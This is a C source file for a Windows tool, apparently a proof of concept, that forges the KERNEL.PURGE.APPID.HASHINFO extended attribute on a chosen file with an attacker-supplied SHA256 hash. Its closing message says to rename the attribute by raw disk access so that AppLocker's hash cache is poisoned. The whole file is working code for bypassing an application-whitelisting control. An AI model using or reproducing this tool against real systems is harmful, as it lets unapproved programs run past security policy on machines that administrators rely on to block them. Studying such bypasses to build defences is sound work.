#include <stdio.h>
#include <Windows.h>
#include <tchar.h>

#pragma comment(lib, "ntdll.lib")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_NO_MORE_EAS ((NTSTATUS)0x80000012L)
#define EA_NAME "KERNEL.PURGE.APPID.HASHINFO"
#define EA_NAME_LENGTH 28
#define EA_VALUE_LENGTH 0x33 //total size of EA value
#define EA_TOTAL_LENGTH (sizeof(FILE_FULL_EA_INFORMATION) + EA_NAME_LENGTH + EA_VALUE_LENGTH - 3)
#define Add2Ptr(Ptr,Inc) ((PVOID)((PUCHAR)(Ptr) + (Inc)))
#define SHA256_HASH_LENGTH_BYTES 32

typedef struct _FILE_EA_INFORMATION
{
	ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
	} DUMMYUNIONNAME;

	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;


typedef enum _FILE_INFORMATION_CLASS
{
	FileEaInformation = 7,
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

__kernel_entry NTSYSCALLAPI NTSTATUS NtQueryInformationFile(
	HANDLE FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID FileInformation,
	ULONG Length,
	FILE_INFORMATION_CLASS FileInformationClass
);

NTSTATUS NtQueryEaFile(
	HANDLE FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID Buffer,
	ULONG Length,
	BOOLEAN ReturnSingleEntry,
	PVOID EaList,
	ULONG EaListLength,
	PULONG EaIndex,
	BOOLEAN RestartScan
);

NTSTATUS NtSetEaFile(
	HANDLE FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID Buffer,
	ULONG Length
);

ULONG RtlNtStatusToDosError(
	NTSTATUS Status
);

typedef struct _FILE_FULL_EA_INFORMATION
{
	ULONG NextEntryOffset;
	UCHAR Flags;
	UCHAR EaNameLength;
	USHORT EaValueLength;
	CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;


int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
{
	UNREFERENCED_PARAMETER(envp);

	if (3 != argc)
	{
		_tprintf(_T("Usage: SetAppLockerHashCache FileName SHA256Hash\r\n"));
		return -1;
	}

	PTCHAR pszFileName;
	PTCHAR pszHash;
	HANDLE hFileHandle;
	NTSTATUS Status;
	FILE_EA_INFORMATION eaInfo;
	IO_STATUS_BLOCK iosb = {0};
	char szAttrName[EA_NAME_LENGTH + 1] = {0};
	PVOID pEaBuffer;
	byte bHash[SHA256_HASH_LENGTH_BYTES] = {0};

	pszFileName = argv[1];
	pszHash = argv[2];

	//hash into array
	if ('x' == pszHash[1]) //0x...
	{
		pszHash = Add2Ptr(pszHash, 2 * sizeof(TCHAR));
	}

	if (SHA256_HASH_LENGTH_BYTES * 2 != _tcslen(pszHash))
	{
		_tprintf(_T("SHA256 hash must contain 64 hex digits.\r\n"));
		return -1;
	}

	char cHash[SHA256_HASH_LENGTH_BYTES * 2 + 1] = {0};
	sprintf_s(cHash, sizeof(cHash), "%ls", pszHash);
	byte i1 = 0;
	for (DWORD i = 0; i < (SHA256_HASH_LENGTH_BYTES * 2); i++)
	{
		BOOL bEven = ((i % 2) == 0);
		char c = (char)toupper(cHash[i]);
		if (c >= '0' && c <= '9')
		{
			i1 += c - '0';
		}
		else if (c >= 'A' && c <= 'F')
		{
			i1 += c - 'A' + 10;
		}
		else
		{
			_tprintf(_T("SHA256 hash may contain only hex digits (0-9,A-F).\r\n"));
			return -1;
		}
		if (bEven)
		{
			i1 = (byte)(i1 << 4u);
		}
		else
		{
			bHash[(i - 1) / 2] = i1;
			i1 = 0;
		}
	}

	hFileHandle = CreateFile(
		pszFileName,
		FILE_READ_EA | FILE_WRITE_EA,
		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
		0);
	if (hFileHandle == INVALID_HANDLE_VALUE)
	{
		_tprintf(_T("ERROR: CreateFile(FILE_READ_EA) returned %lu\r\n"), GetLastError());
		return (int)GetLastError();
	}

	Status = NtQueryInformationFile(
		hFileHandle,
		&iosb,
		&eaInfo,
		sizeof(eaInfo),
		FileEaInformation);
	if (!NT_SUCCESS(Status))
	{
		_tprintf(_T("ERROR: NtQueryInformationFile() returned %lu\r\n"), RtlNtStatusToDosError(Status));
		CloseHandle(hFileHandle);
		return (int)RtlNtStatusToDosError(Status);
	}

	if (0 != eaInfo.EaSize) //some EAs exist!
	{
		ULONG ulEaBufferSize;
		RtlZeroMemory(&iosb, sizeof(iosb));
		ulEaBufferSize = eaInfo.EaSize;
		pEaBuffer = LocalAlloc(LPTR, ulEaBufferSize);
		if (NULL == pEaBuffer)
		{
			_tprintf(_T("ERROR: LocalAlloc() failed.\r\n"));
			CloseHandle(hFileHandle);
			return ERROR_NOT_ENOUGH_MEMORY;
		}

		RtlZeroMemory(szAttrName, sizeof(szAttrName));
		szAttrName[0] = '$';
		strcat_s(szAttrName, sizeof(szAttrName), EA_NAME);

		while (TRUE)
		{
			Status = NtQueryEaFile(
				hFileHandle,
				&iosb,
				pEaBuffer,
				ulEaBufferSize,
				TRUE,
				NULL,
				0,
				NULL,
				FALSE);


			if (Status == STATUS_NO_MORE_EAS)
			{
				break;
			}

			if (!NT_SUCCESS(Status))
			{
				_tprintf(_T("ERROR: NtQueryEaFile() returned %lu\r\n"), RtlNtStatusToDosError(Status));
				LocalFree(pEaBuffer);
				CloseHandle(hFileHandle);
				return (int)RtlNtStatusToDosError(Status);
			}

			if (0 == _stricmp(szAttrName, ((PFILE_FULL_EA_INFORMATION)pEaBuffer)->EaName))
			{
				_tprintf(_T("ERROR: EA already exists. Exiting. You can try with a fresh copy of your file.\r\n"));
				LocalFree(pEaBuffer);
				CloseHandle(hFileHandle);
				return ERROR_ALREADY_EXISTS;
			}
		}
		LocalFree(pEaBuffer);
	}

	//no KERNEL.PURGE.APPID.HASHINFO EA exists. Good to go.
	RtlZeroMemory(&iosb, sizeof(iosb));
	RtlZeroMemory(szAttrName, sizeof(szAttrName));
	szAttrName[0] = '#';
	strcat_s(szAttrName, sizeof(szAttrName), EA_NAME);

	pEaBuffer = LocalAlloc(LPTR, EA_TOTAL_LENGTH);
	if (NULL == pEaBuffer)
	{
		_tprintf(_T("ERROR: LocalAlloc() failed.\r\n"));
		CloseHandle(hFileHandle);
		return ERROR_NOT_ENOUGH_MEMORY;
	}
	((PFILE_FULL_EA_INFORMATION)pEaBuffer)->NextEntryOffset = 0;
	((PFILE_FULL_EA_INFORMATION)pEaBuffer)->Flags = 0;
	((PFILE_FULL_EA_INFORMATION)pEaBuffer)->EaNameLength = EA_NAME_LENGTH;
	((PFILE_FULL_EA_INFORMATION)pEaBuffer)->EaValueLength = EA_VALUE_LENGTH;
	memcpy(((PFILE_FULL_EA_INFORMATION)pEaBuffer)->EaName, szAttrName, sizeof(szAttrName));
	memcpy(((PFILE_FULL_EA_INFORMATION)pEaBuffer)->EaName + EA_NAME_LENGTH + 4, "AID1", 4);
	memcpy(Add2Ptr(pEaBuffer, 0x34), " ", 1);
	memcpy(Add2Ptr(pEaBuffer, 0x38), bHash, SHA256_HASH_LENGTH_BYTES);

	Status = NtSetEaFile(
		hFileHandle,
		&iosb,
		pEaBuffer,
		EA_TOTAL_LENGTH
	);

	if (!NT_SUCCESS(Status))
	{
		_tprintf(_T("ERROR: NtSetEaFile() returned %lu\r\n"), RtlNtStatusToDosError(Status));
		LocalFree(pEaBuffer);
		CloseHandle(hFileHandle);
		return (int)RtlNtStatusToDosError(Status);
	}

	_tprintf(_T("\r\nDone. USE RAW DISK ACCESS TO RENAME #%hs to $%hs\r\n"), EA_NAME, EA_NAME);
	LocalFree(pEaBuffer);
	CloseHandle(hFileHandle);
	return 0;
}
